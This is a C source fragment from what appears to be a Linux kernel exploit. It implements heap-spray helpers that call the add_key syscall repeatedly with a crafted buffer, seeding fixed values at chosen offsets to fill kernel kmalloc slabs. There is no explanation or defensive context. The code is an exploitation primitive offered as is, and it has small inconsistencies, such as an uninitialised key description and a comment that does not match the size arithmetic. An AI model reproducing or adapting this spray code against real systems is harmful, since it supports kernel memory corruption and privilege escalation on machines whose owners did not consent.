#define SPRAY_BUF_SIZE 247
char spray_buffer[248];
void spray_buffer_init(){
    *(unsigned long*)(spray_buffer + 40)=0xfacea6d8;
    *(unsigned long*)(spray_buffer + 56)=0x100000000000000;
}

#include <stdio.h>
volatile int do_spray=1;
void kmalloc_no_free(int times)
{
    int i;
    int ret;
    char buf[256];
    for(i = 0; i < times; i++){
        //sprintf(buf,"wtf%d",i);
        //memset(exploitbuf2,0x43+i,255);
        ret=syscall(__NR_add_key, "user", buf, spray_buffer, SPRAY_BUF_SIZE-0x18, -2);
        /*sizeof(struct user_key_payload)=18*/
        printf("%x\n", ret);
    }
}
void kmalloc(int times)
{
    int i;
    int ret;
        //for(i=0;i<1024;i++)
    for(i=0;i<times;i++){
        if(do_spray){
            //syscall(__NR_add_key, "user", "wtf", exploitbuf, SPRAY_BUF_SIZE, -2);
            ret=syscall(__NR_add_key, "root", "wtf", spray_buffer, SPRAY_BUF_SIZE, -2);
        }
    }
}